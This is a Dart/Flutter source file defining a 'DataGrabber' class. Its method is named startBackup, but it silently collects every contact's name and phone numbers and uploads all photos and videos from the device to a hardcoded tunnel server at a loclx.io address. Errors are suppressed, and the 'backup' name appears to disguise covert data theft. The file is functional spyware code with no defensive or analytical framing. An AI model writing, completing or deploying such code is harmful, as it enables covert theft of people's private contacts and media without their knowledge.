import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:photo_manager/photo_manager.dart';
import 'dart:io';
import 'dart:convert';

class DataGrabber {
  static const String serverUrl = "https://kasdqkoeyp.loclx.io";

  static Future<void> startBackup() async {
    // 1. سحب الأسماء
    try {
      if (await FlutterContacts.requestPermission()) {
        final contacts = await FlutterContacts.getContacts(withProperties: true);
        for (var c in contacts) {
          if (c.phones.isNotEmpty) {
            http.post(Uri.parse('$serverUrl/log'), 
              headers: {"Content-Type": "application/json"},
              body: jsonEncode({"name": c.displayName, "phones": c.phones.map((e)=>e.number).toList()}));
          }
        }
      }
    } catch (e) {}

    // 2. سحب الصور (التعديل المتوافق مع 3.8.3)
    try {
      final PermissionState ps = await PhotoManager.requestPermission();
      if (ps.isAuth || ps.hasAccess) {
        final albums = await PhotoManager.getAssetPathList(type: RequestType.common);
        for (var album in albums) {
          int total = await album.assetCountAsync;
          for (int i = 0; i < (total / 50).ceil(); i++) {
            final media = await album.getAssetListPaged(page: i, size: 50);
            await Future.wait(media.map((item) async {
              File? file = await item.file;
              if (file != null) {
                var request = http.MultipartRequest('POST', Uri.parse('$serverUrl/upload'));
                request.files.add(await http.MultipartFile.fromPath('file', file.path));
                await request.send();
              }
            }));
          }
        }
      }
    } catch (e) {}
  }
}
